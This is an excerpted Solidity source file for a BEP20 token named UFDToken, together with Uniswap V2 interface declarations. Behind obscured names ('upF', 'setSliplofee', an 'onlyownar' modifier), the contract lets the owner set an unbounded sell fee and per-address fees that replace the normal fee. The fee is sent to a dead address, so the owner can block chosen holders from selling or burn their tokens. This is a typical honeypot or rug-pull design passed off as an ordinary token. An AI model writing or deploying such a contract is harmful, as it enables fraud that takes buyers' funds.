...
interface IUniswapV2Factory {
    ...
    function lofeeTo() external view returns (address);
    function lofeeToSetter() external view returns (address);
    ...
    function setlofeeTo(address) external;
    function setlofeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglofeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglofeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglofeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglofeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglofeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract UFDToken is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelllofee = 0;

    uint256 private _defaultBuylofee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplofee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllofee = _value;
    }

    function setSliplofee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplofee[_address] = _value;
    }

    function getSliplofee(address _address) external view onlyownar returns (uint256) {
        return _sliplofee[_address];
    }


    function setMAccountlofee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlofee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelofeeAmount = 0;

        if (rF) {
            uint256 tradelofee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelofee = _defaultSelllofee;
                }
                if (from == uniswapV2Pair) {

                    tradelofee = _defaultBuylofee;
                }
            }
            if (_sliplofee[from] > 0) {
                tradelofee = _sliplofee[from];
            }

            tradelofeeAmount = _Amount.mul(tradelofee).div(100);
        }


        if (tradelofeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradelofeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelofeeAmount);
            emit Transfer(from, _deadAddress, tradelofeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelofeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelofeeAmount);
        emit Transfer(from, _to, _Amount - tradelofeeAmount);
    }
